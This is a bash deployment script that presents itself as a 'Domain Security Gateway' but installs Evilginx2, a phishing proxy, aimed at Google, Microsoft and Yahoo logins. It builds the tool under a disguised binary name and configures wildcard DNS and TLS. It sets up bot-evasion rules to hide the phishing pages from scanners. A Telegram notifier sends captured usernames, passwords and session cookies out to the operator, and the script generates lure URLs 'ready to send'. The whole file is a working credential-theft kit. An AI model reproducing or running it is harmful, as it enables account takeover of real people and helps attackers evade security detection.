#!/bin/bash
# ============================================================================
# Domain Security Gateway - HTTPS-Only Automated Installer
# ============================================================================
# This script REQUIRES wildcard SSL certificate. NO HTTP FALLBACK.
# If SSL fails, the installation aborts.
# ============================================================================
# Usage: sudo bash deploy.sh --domain example.com --vps-ip 1.2.3.4 --api-token CF-xxxxx
# ============================================================================

set -euo pipefail
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Default values
DOMAIN=""
VPS_IP=""
API_TOKEN=""
NOTIFY_TOKEN=""
NOTIFY_ID=""
HTTP_PORT=80
HTTPS_PORT=443
UNAUTH_URL="https://www.google.com"
WEBHOOK_SECRET=$(openssl rand -hex 16)
APP_DIR="/opt/gateway"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Helper functions
log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1"; exit 1; }
info() { echo -e "${BLUE}[*]${NC} $1"; }
success() { echo -e "${CYAN}[✓]${NC} $1"; }

print_banner() {
    clear
    echo -e "${BLUE}"
    cat << "EOF"
    ╔══════════════════════════════════════════════════════════════════════╗
    ║                    Domain Security Gateway v3.0                      ║
    ║                    HTTPS-ONLY | No HTTP Fallback                     ║
    ║                    Wildcard SSL Certificate Required                 ║
    ╚══════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

show_help() {
    cat << EOF

${GREEN}USAGE:${NC}
  sudo bash deploy.sh --domain DOMAIN --vps-ip IP --api-token TOKEN

${GREEN}REQUIRED:${NC}
  --domain DOMAIN           Your domain name
  --vps-ip IP               Server IP address
  --api-token TOKEN         Cloudflare API token (DNS:Edit permission)

${GREEN}OPTIONAL:${NC}
  --notify-token TOKEN      Telegram bot token
  --notify-id ID            Telegram chat ID

${GREEN}EXAMPLE:${NC}
  sudo bash deploy.sh \\
    --domain "example.com" \\
    --vps-ip "192.168.1.1" \\
    --api-token "CF-xxxxx" \\
    --notify-token "123456:ABC-def" \\
    --notify-id "123456789"

EOF
    echo -e "${RED}NOTE:${NC} This script REQUIRES HTTPS. No HTTP fallback available."
    echo -e "      SSL certificate issuance is mandatory."
    echo ""
}

parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            --domain) DOMAIN="$2"; shift 2 ;;
            --vps-ip) VPS_IP="$2"; shift 2 ;;
            --api-token) API_TOKEN="$2"; shift 2 ;;
            --notify-token) NOTIFY_TOKEN="$2"; shift 2 ;;
            --notify-id) NOTIFY_ID="$2"; shift 2 ;;
            --help|-h) show_help; exit 0 ;;
            *) error "Unknown argument: $1" ;;
        esac
    done

    if [[ -z "$DOMAIN" ]]; then error "Domain is required"; fi
    if [[ -z "$VPS_IP" ]]; then error "VPS IP is required"; fi
    if [[ -z "$API_TOKEN" ]]; then error "Cloudflare API token is required"; fi
}

# ============================================================================
# VALIDATE PREREQUISITES BEFORE STARTING
# ============================================================================
validate_prerequisites() {
    log "Validating prerequisites..."
    
    # Check if running as root
    if [[ $EUID -ne 0 ]]; then
        error "This script must be run as root (sudo)"
    fi
    
    # Check if domain resolves
    DOMAIN_IP=$(dig +short "$DOMAIN" | head -1)
    if [[ -z "$DOMAIN_IP" ]]; then
        error "Domain $DOMAIN does not resolve. Please add DNS records first."
    fi
    
    # Check if Cloudflare token works
    ZONE_TEST=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones?name=$DOMAIN" \
        -H "Authorization: Bearer $API_TOKEN" \
        -H "Content-Type: application/json" | jq -r '.success')
    
    if [[ "$ZONE_TEST" != "true" ]]; then
        error "Invalid Cloudflare API token or insufficient permissions"
    fi
    
    success "Prerequisites validated"
}

# ============================================================================
# PHASE 1: CHECK LOCAL FILES
# ============================================================================
phase_check_files() {
    log "Checking local resource files..."
    
    if [[ ! -f "$SCRIPT_DIR/phishlets/google.yaml" ]]; then
        error "phishlets/google.yaml not found"
    fi
    if [[ ! -f "$SCRIPT_DIR/phishlets/microsoft.yaml" ]]; then
        error "phishlets/microsoft.yaml not found"
    fi
    if [[ ! -f "$SCRIPT_DIR/phishlets/yahoo.yaml" ]]; then
        error "phishlets/yahoo.yaml not found"
    fi
    
    success "Resource files verified (edit these before deployment if needed)"
}

# ============================================================================
# PHASE 2: CLOUDFLARE DNS (WILDCARD)
# ============================================================================
phase_dns() {
    log "Configuring Cloudflare wildcard DNS..."
    
    # Get zone ID
    ZONE_INFO=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones?name=$DOMAIN" \
        -H "Authorization: Bearer $API_TOKEN" \
        -H "Content-Type: application/json")
    
    ZONE_ID=$(echo "$ZONE_INFO" | jq -r '.result[0].id')
    ZONE_SUCCESS=$(echo "$ZONE_INFO" | jq -r '.success')

    if [[ "$ZONE_ID" == "null" ]] || [[ -z "$ZONE_ID" ]] || [[ "$ZONE_SUCCESS" != "true" ]]; then
        error "Could not find zone for $DOMAIN or API error: $(echo "$ZONE_INFO" | jq -r '.errors[0].message')"
    fi
    success "Cloudflare Zone ID: $ZONE_ID"
    
    # Function to create or update DNS A record
    upsert_dns_record() {
        local record_name="$1"
        local record_content="$2"
        local record_type="A"
        local proxied="false"
        local ttl=120

        log "Upserting DNS record: $record_name -> $record_content"

        # Check if record exists
        local existing_record=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones/$ZONE_ID/dns_records?name=$record_name&type=$record_type" \
            -H "Authorization: Bearer $API_TOKEN" \
            -H "Content-Type: application/json")
        
        local record_id=$(echo "$existing_record" | jq -r '.result[0].id')
        local record_exists=$(echo "$existing_record" | jq -r '.success')

        if [[ "$record_id" != "null" ]] && [[ "$record_exists" == "true" ]]; then
            # Update existing record
            local response=$(curl -s -X PUT "https://api.cloudflare.com/client/v4/zones/$ZONE_ID/dns_records/$record_id" \
                -H "Authorization: Bearer $API_TOKEN" \
                -H "Content-Type: application/json" \
                -d "{\"type\":\"$record_type\",\"name\":\"$record_name\",\"content\":\"$record_content\",\"ttl\":$ttl,\"proxied\":$proxied}")
        else
            # Create new record
            local response=$(curl -s -X POST "https://api.cloudflare.com/client/v4/zones/$ZONE_ID/dns_records" \
                -H "Authorization: Bearer $API_TOKEN" \
                -H "Content-Type: application/json" \
                -d "{\"type\":\"$record_type\",\"name\":\"$record_name\",\"content\":\"$record_content\",\"ttl\":$ttl,\"proxied\":$proxied}")
        fi
        
        echo "$response" | jq -e '.success == true' >/dev/null || error "Failed to upsert DNS record $record_name: $(echo "$response" | jq -r '.errors[0].message')"
    }
    
    upsert_dns_record "*.$DOMAIN" "$VPS_IP"
    upsert_dns_record "$DOMAIN" "$VPS_IP"
    
    success "Wildcard DNS configured for *.$DOMAIN and $DOMAIN -> $VPS_IP"
}

# ============================================================================
# PHASE 3: WILDCARD SSL CERTIFICATE
# ============================================================================
phase_ssl() {
    log "Obtaining wildcard SSL certificate..."
    # Ensure certbot and cloudflare plugin are installed
    apt-get update -y >/dev/null
    apt-get install -y certbot python3-certbot-dns-cloudflare >/dev/null
    
    cat > /etc/letsencrypt/cloudflare.ini << EOF
dns_cloudflare_api_token = $API_TOKEN
EOF
    chmod 600 /etc/letsencrypt/cloudflare.ini
    
    # Wait for DNS propagation
    log "Waiting 30 seconds for DNS propagation..."
    sleep 30

    # Attempt to obtain certificate
    log "Requesting wildcard certificate for *.$DOMAIN (may take 1-2 minutes)..."
    if certbot certonly --dns-cloudflare \
        --dns-cloudflare-credentials /etc/letsencrypt/cloudflare.ini \
        --dns-cloudflare-propagation-seconds 120 \
        --non-interactive --agree-tos --email "admin@$DOMAIN" --no-eff-email \
        -d "$DOMAIN" -d "*.$DOMAIN"; then

        mkdir -p "$APP_DIR/certs"
        # Copy certificates
        cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$APP_DIR/certs/$DOMAIN.crt"
        cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$APP_DIR/certs/$DOMAIN.key"

        # Verify certificates are valid
        if openssl verify -CAfile <(cat "$APP_DIR/certs/$DOMAIN.crt") "$APP_DIR/certs/$DOMAIN.crt" 2>/dev/null; then
            success "Wildcard SSL certificate successfully installed and verified"
        else
            error "SSL certificate installed but verification failed"
        fi

        # Create a renewal hook for Certbot
        mkdir -p /etc/letsencrypt/renewal-hooks/post
        cat > "/etc/letsencrypt/renewal-hooks/post/gateway-cert-copy.sh" << RENEWAL_HOOK
#!/bin/bash
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$APP_DIR/certs/$DOMAIN.crt"
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$APP_DIR/certs/$DOMAIN.key"
systemctl restart gateway || true
RENEWAL_HOOK
        chmod +x "/etc/letsencrypt/renewal-hooks/post/gateway-cert-copy.sh"
    else
        error "SSL certificate issuance FAILED. HTTPS is required. Check your Cloudflare token and DNS settings."
    fi
}

# ============================================================================
# PHASE 4: INSTALL DEPENDENCIES
# ============================================================================
phase_dependencies() {
    log "Installing system dependencies..."
    
    apt-get update -y >/dev/null
    apt-get install -y git curl wget build-essential golang-go openssl jq \
        dnsutils python3 python3-requests expect nginx fail2ban >/dev/null
    
    # Install specific Go version only if not already present to save time
    if [[ ! -f "/usr/local/go/bin/go" ]] || [[ "$(/usr/local/go/bin/go version)" != *"go1.22.0"* ]]; then
        info "Installing Go 1.22.0..."
    wget -q https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
    rm -rf /usr/local/go
    tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
    rm -f go1.22.0.linux-amd64.tar.gz
    fi

    # Ensure the current session uses the correct Go path
    export PATH=/usr/local/go/bin:$PATH
    
    # Set Go proxy for faster/correct downloads
    echo 'export GOPROXY=https://goproxy.io,direct' >> ~/.bashrc
    echo 'export GO111MODULE=on' >> ~/.bashrc
    
    success "Dependencies installed"
}

# ============================================================================
# PHASE 5: BUILD SERVICE
# ============================================================================
phase_build() {
    log "Building core service..."
    
    rm -rf /tmp/.build_cache
    # FIXED: Cloning the correct repository (evilginx2 contains v3)
    git clone https://github.com/kgretzky/evilginx2.git /tmp/.build_cache
    cd /tmp/.build_cache
    
    # Set Go proxy
    export GOPROXY=https://goproxy.io,direct
    export GO111MODULE=on
    
    # Run go mod tidy first
    /usr/local/go/bin/go mod tidy
    
    # Obfuscate the binary name during build
    /usr/local/go/bin/go build -o sys-svc 
    
    [[ ! -f "sys-svc" ]] && error "Build failed - sys-svc binary not found"

    mkdir -p "$APP_DIR"/{config,phishlets,certs,storage,logs,notifications,html}
    cp sys-svc /usr/local/bin/sys-svc
    chmod +x /usr/local/bin/sys-svc
    
    success "Service built"
}

# ============================================================================
# PHASE 6: DEPLOY RESOURCES FROM LOCAL FILES
# ============================================================================
phase_deploy_resources() {
    log "Deploying resources from local files..."
    
    # Generate random subdomain prefixes
    EP1="gw-$(openssl rand -hex 3)"
    EP2="auth-$(openssl rand -hex 3)"
    EP3="portal-$(openssl rand -hex 3)"
    
    echo "$EP1" > "$APP_DIR/.ep1"
    echo "$EP2" > "$APP_DIR/.ep2"
    echo "$EP3" > "$APP_DIR/.ep3"

    # Create phishlets directory (NOT resources)
    mkdir -p "$APP_DIR/phishlets"

    # Copy from local phishlets directory
    cp "$SCRIPT_DIR/phishlets/google.yaml" "$APP_DIR/phishlets/"
    cp "$SCRIPT_DIR/phishlets/microsoft.yaml" "$APP_DIR/phishlets/"
    cp "$SCRIPT_DIR/phishlets/yahoo.yaml" "$APP_DIR/phishlets/"
    
    # Verify files copied
    [[ ! -f "$APP_DIR/phishlets/google.yaml" ]] && error "Failed to copy google.yaml to $APP_DIR/phishlets/"
    
    # Replace placeholders
    sed -i "s/{{.Domain}}/$DOMAIN/g" "$APP_DIR/phishlets/"*.yaml
    sed -i "s/{{.Endpoint1}}/$EP1/g" "$APP_DIR/phishlets/yahoo.yaml"
    sed -i "s/{{.Endpoint2}}/$EP2/g" "$APP_DIR/phishlets/microsoft.yaml"
    sed -i "s/{{.Endpoint3}}/$EP3/g" "$APP_DIR/phishlets/google.yaml"
    sed -i "s/{{.VpsIp}}/$VPS_IP/g" "$APP_DIR/phishlets/"*.yaml
    sed -i "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" "$APP_DIR/phishlets/"*.yaml
    sed -i "s/{{.AppPort}}/$HTTP_PORT/g" "$APP_DIR/phishlets/"*.yaml
    
    success "Phishlets deployed"
    log "  Yahoo: $EP1.$DOMAIN"
    log "  Microsoft: $EP2.$DOMAIN"
    log "  Google: $EP3.$DOMAIN"
}

# ============================================================================
# PHASE 7: CREATE CONFIGURATION
# ============================================================================
phase_config() {
    log "Creating configuration..."
    
    cat > "$APP_DIR/config/config.yaml" << EOF
daemon: true
debug: false
domain: $DOMAIN
ipv4: $VPS_IP
http_port: $HTTP_PORT
https_port: $HTTPS_PORT # Will be 0 if SSL failed
unauth_url: $UNAUTH_URL
dns_port: 0
autocert: false
phishlets_path: $APP_DIR/phishlets
cert_path: $APP_DIR/certs
database: $APP_DIR/storage/data.db

# STEALTH SETTINGS - Anti Bot/Crawler
blacklist:
  enabled: true
  max_requests: 5
  block_duration: 86400

rate_limit:
  enabled: true
  requests_per_ip: 10
  window_seconds: 60
  ban_duration: 3600

user_agent_filter:
  enabled: true
  block_empty: true
  block_common_bots: true
  allowed_browsers:
    - "chrome"
    - "firefox" 
    - "safari"
    - "edge"
    - "opera"

bot_trap:
  enabled: true
  redirect_target: "$UNAUTH_URL"
  log_hits: true

ip_whitelist:
  enabled: true
  ips:
    - "127.0.0.1"
EOF

    success "Configuration created"
}

# ============================================================================
# PHASE 7.5: STEALTH COMPONENTS (NGINX & FAIL2BAN)
# ============================================================================
phase_stealth_setup() {
    log "Setting up stealth components (Nginx + Fail2Ban)..."

    # Ensure HTML directory exists for the bot-trap
    mkdir -p "$APP_DIR/html"

    # Stop any conflicting web services that might hold port 80
    if systemctl is-active --quiet apache2; then
        warn "Apache2 detected. Stopping to prevent port conflict..."
        systemctl stop apache2
        systemctl disable apache2
    fi

    # Bot Trap Page
    mkdir -p "$APP_DIR/html"
    cat > "$APP_DIR/html/bot-trap.html" << 'HTML'
<!DOCTYPE html><html><head><title>Loading...</title><script>
if(/bot|crawler|spider|scanner|curl|wget|python|headless/i.test(navigator.userAgent.toLowerCase())||navigator.webdriver){window.location.href="https://www.google.com";}
</script></head><body><div style="text-align:center;margin-top:20%;"><h2>Verifying your browser...</h2></div></body></html>
HTML

    # Nginx Configuration
    cat > /etc/nginx/sites-available/gateway << EOF
server {
    listen 80 default_server;
    server_name _;
    
    # Bot detection
    if (\$http_user_agent ~* (bot|crawler|spider|scanner|curl|wget|python)) { return 404; }
    if (\$http_user_agent = "") { return 404; }
    
    # Redirect all HTTP to HTTPS
    return 301 https://\$host\$request_uri;
}

server {
    listen 443 ssl default_server;
    server_name _;
    
    ssl_certificate $APP_DIR/certs/$DOMAIN.crt;
    ssl_certificate_key $APP_DIR/certs/$DOMAIN.key;
    
    # Bot detection
    if (\$http_user_agent ~* (bot|crawler|spider|scanner|curl|wget|python)) { return 404; }
    if (\$http_user_agent = "") { return 404; }
    
    location / {
        # Internal high port for Evilginx
        proxy_pass https://127.0.0.1:8443;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
}
EOF
    ln -sf /etc/nginx/sites-available/gateway /etc/nginx/sites-enabled/
    rm -f /etc/nginx/sites-enabled/default
    nginx -t || error "Nginx configuration invalid"
    systemctl restart nginx

    # Fail2Ban Configuration
    cat > /etc/fail2ban/filter.d/evilginx.conf << EOF
[Definition]
failregex = ^<HOST> .* "GET .* HTTP/.*" 404
ignoreregex =
EOF

    cat > /etc/fail2ban/jail.local << EOF
[evilginx]
enabled = true
port = http,https
filter = evilginx
logpath = $APP_DIR/logs/access.log
maxretry = 3
bantime = 86400
EOF
    systemctl restart fail2ban
    success "Stealth components active"
}

# ============================================================================
# PHASE 8: TELEGRAM NOTIFICATION SERVICE (CREDENTIALS + COOKIES)
# ============================================================================
phase_notifications() {
    if [[ -n "$NOTIFY_TOKEN" ]] && [[ -n "$NOTIFY_ID" ]]; then
        log "Setting up Telegram notifications..."
        
        cat > "$APP_DIR/notifications/notify.py" << 'EOF'
#!/usr/bin/env python3
import os, time, sqlite3, requests, json
from datetime import datetime

TOKEN = "{{TOKEN}}"
CHAT = "{{CHAT}}"
DB_PATH = "/opt/gateway/storage/data.db"
LAST_FILE = "/opt/gateway/notifications/last_id.txt"

def send_message(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": CHAT, "text": text, "parse_mode": "HTML"}, timeout=10)
    except Exception as e:
        print(f"Send error: {e}")

def send_file(content, filename):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    try:
        files = {'document': (filename, content)}
        data = {'chat_id': CHAT, 'caption': filename}
        requests.post(url, files=files, data=data, timeout=30)
    except Exception as e:
        print(f"File send error: {e}")

def get_last_id():
    if os.path.exists(LAST_FILE):
        with open(LAST_FILE, 'r') as f:
            return int(f.read().strip())
    return 0

def save_last_id(last_id):
    with open(LAST_FILE, 'w') as f:
        f.write(str(last_id))

last_id = get_last_id()

while True:
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Check for new sessions (credentials captured) - Using parameterized query
        cursor.execute("""
            SELECT id, phishlet, username, password, auth_token, ip, created_at 
            FROM sessions WHERE id > ? ORDER BY id ASC
        """, (last_id,))
        
        rows = cursor.fetchall()
        
        for row in rows:
            sid, service, username, password, token, ip, timestamp = row
            
            # Send credentials notification
            msg = f"""🔐 <b>LOGIN CREDENTIALS CAPTURED</b>

📧 <b>Service:</b> {service}
👤 <b>Username:</b> <code>{username}</code>
🔑 <b>Password:</b> <code>{password}</code>
🌐 <b>IP Address:</b> {ip}
⏰ <b>Time:</b> {timestamp}"""
            
            send_message(msg)
            
            # If session cookies exist, send them as file
            if token and len(token) > 10:
                cookie_file = f"{service}_{username}_session.txt"
                cookie_content = f"""Service: {service}
Username: {username}
Time: {timestamp}
IP: {ip}

=== SESSION COOKIES ===
{token}
"""
                send_file(cookie_content.encode(), cookie_file)
            
            last_id = sid
            save_last_id(last_id)
        
        conn.close()
        
    except Exception as e:
        # Log specific errors for debugging
        print(f"[{datetime.now()}] Notification service error: {e}")
        # Optionally, add more specific exception handling for sqlite3.OperationalError etc.
    
    time.sleep(3)
EOF
        
        sed -i "s/{{TOKEN}}/$NOTIFY_TOKEN/g" "$APP_DIR/notifications/notify.py"
        sed -i "s/{{CHAT}}/$NOTIFY_ID/g" "$APP_DIR/notifications/notify.py"
        chmod +x "$APP_DIR/notifications/notify.py"
        
        cat > /etc/systemd/system/gateway-notify.service << EOF
[Unit]
Description=Gateway Notification Service
After=network.target gateway.service

[Service]
Type=simple
User=root
WorkingDirectory=$APP_DIR/notifications
ExecStart=/usr/bin/python3 $APP_DIR/notifications/notify.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

        systemctl daemon-reload
        systemctl enable gateway-notify
        systemctl start gateway-notify
        success "Telegram notifications active (credentials + session cookies)"
    else
        info "Skipping Telegram notifications (no credentials provided)"
    fi
}

# ============================================================================
# PHASE 9: SYSTEMD SERVICE
# ============================================================================
phase_service() {
    log "Creating system service..."
    
    cat > /etc/systemd/system/gateway.service << EOF
[Unit]
Description=Domain Gateway Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/gateway
ExecStart=/bin/sh -c '/usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/phishlets >> /opt/gateway/logs/access.log 2>&1'
Restart=always
RestartSec=5
NoNewPrivileges=true
CapabilityBoundingSet=CAP_NET_BIND_SERVICE

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable gateway
    systemctl start gateway
    
    sleep 3
    success "Service started"
}

# ============================================================================
# PHASE 10: CONFIGURE AND GENERATE REAL URLs
# ============================================================================
phase_generate_urls() {
    log "Configuring service and generating access URLs..."
    
    systemctl stop gateway 2>/dev/null || true
    sleep 5
    sed -i 's/daemon: true/daemon: false/' "$APP_DIR/config/config.yaml"
    
    EP1=$(cat "$APP_DIR/.ep1")
    EP2=$(cat "$APP_DIR/.ep2")
    EP3=$(cat "$APP_DIR/.ep3")
    
    # Create expect script for automatic configuration
    cat > /tmp/configure.exp << 'EOF'
#!/usr/bin/expect -f
set timeout 60
log_user 0
spawn /usr/local/bin/sys-svc -c $env(APP_DIR)/config -p $env(APP_DIR)/phishlets

expect "gateway>" { send "config domain $env(DOMAIN)\r" }
expect "gateway>" { send "config ipv4 external $env(VPS_IP)\r" }
# Enable bot protection
expect "gateway>" { send "blacklist on\r" }

expect "gateway>" { send "phishlets hostname yahoo $env(EP1).$env(DOMAIN)\r" }
expect "gateway>" { send "phishlets enable yahoo\r" }
expect "gateway>" { send "phishlets hostname microsoft $env(EP2).$env(DOMAIN)\r" }
expect "gateway>" { send "phishlets enable microsoft\r" }
expect "gateway>" { send "phishlets hostname google $env(EP3).$env(DOMAIN)\r" }
expect "gateway>" { send "phishlets enable google\r" }

expect "gateway>" { send "lures create yahoo\r" }
expect -re "created lure with ID: (\\d+)" { set yid $expect_out(1,string) }
expect "gateway>" { send "lures get-url $yid\r" }
expect -re "(https?://[^\\r]+)" { set yurl $expect_out(1,string) }

expect "gateway>" { send "lures create microsoft\r" }
expect -re "created lure with ID: (\\d+)" { set mid $expect_out(1,string) }
expect "gateway>" { send "lures get-url $mid\r" }
expect -re "(https?://[^\\r]+)" { set murl $expect_out(1,string) }

expect "gateway>" { send "lures create google\r" }
expect -re "created lure with ID: (\\d+)" { set gid $expect_out(1,string) }
expect "gateway>" { send "lures get-url $gid\r" }
expect -re "(https?://[^\\r]+)" { set gurl $expect_out(1,string) }

expect "gateway>" { send "exit\r" }

puts "Y_URL=$yurl"
puts "M_URL=$murl"
puts "G_URL=$gurl"
expect eof
EOF

    chmod +x /tmp/configure.exp
    export DOMAIN VPS_IP EP1 EP2 EP3 APP_DIR
    output=$(/tmp/configure.exp 2>/dev/null)
    rm -f /tmp/configure.exp
    
    # After expect completes, re-enable daemon mode
    sed -i 's/daemon: false/daemon: true/' "$APP_DIR/config/config.yaml"

    Y_URL=$(echo "$output" | grep "Y_URL=" | cut -d'=' -f2-)
    M_URL=$(echo "$output" | grep "M_URL=" | cut -d'=' -f2-)
    G_URL=$(echo "$output" | grep "G_URL=" | cut -d'=' -f2-)

    if [[ -z "$Y_URL" || -z "$M_URL" || -z "$G_URL" ]]; then
        error "Failed to generate all access URLs. Check Evilginx console output for errors."
    fi
    
    cat > "$APP_DIR/access_urls.txt" << EOF
========================================
ACCESS URLs - READY TO USE
========================================

YAHOO:     $Y_URL
MICROSOFT: $M_URL
GOOGLE:    $G_URL

========================================
These URLs are ACTIVE and ready to send
========================================
EOF

    success "Access URLs generated"
}

# ============================================================================
# PHASE 11: SUMMARY
# ============================================================================
print_summary() {
    EP1=$(cat "$APP_DIR/.ep1")
    EP2=$(cat "$APP_DIR/.ep2")
    EP3=$(cat "$APP_DIR/.ep3")
    
    echo ""
    echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}                    DEPLOYMENT COMPLETE!                         ${NC}"
    echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${CYAN}📧 ACTIVE HTTPS URLs:${NC}"
    echo -e "  ${GREEN}Yahoo:${NC}     $Y_URL"
    echo -e "  ${GREEN}Microsoft:${NC}  $M_URL"
    echo -e "  ${GREEN}Google:${NC}     $G_URL"
    echo ""
    echo -e "${CYAN}🔧 MANAGEMENT COMMANDS:${NC}"
    echo -e "  Status:     systemctl status gateway"
    echo -e "  Logs:       journalctl -u gateway -f"
    echo -e "  Restart:    systemctl restart gateway"
    echo -e "  Stop:       systemctl stop gateway"
    echo -e "  Console:    sudo /usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/phishlets"
    echo -e "              (Use 'exit' to quit the console without stopping the service)"
    echo ""
    echo -e "${CYAN}📁 EDIT PHISHLETS (if needed):${NC}"
    echo -e "  nano $APP_DIR/phishlets/google.yaml"
    echo -e "  nano $APP_DIR/phishlets/microsoft.yaml"
    echo -e "  nano $APP_DIR/phishlets/yahoo.yaml"
    echo -e "  Then: systemctl restart gateway"
    echo ""
    if [[ -n "$NOTIFY_TOKEN" ]]; then
        echo -e "${CYAN}🤖 TELEGRAM NOTIFICATIONS: ACTIVE${NC}"
        echo -e "  - Credentials sent to Telegram"
        echo -e "  - Session cookies sent as files"
        echo -e "  - Logs: journalctl -u gateway-notify -f"
        echo ""
    fi
    echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================
main() {
    print_banner
    parse_args "$@"
    
    validate_prerequisites
    phase_check_files
    
    phase_dns
    phase_ssl               # REQUIRED - NO FALLBACK
    
    phase_dependencies
    phase_build
    phase_deploy_resources
    phase_config
    phase_stealth_setup
    phase_notifications
    phase_generate_urls
    phase_service
    print_summary
}

main "$@"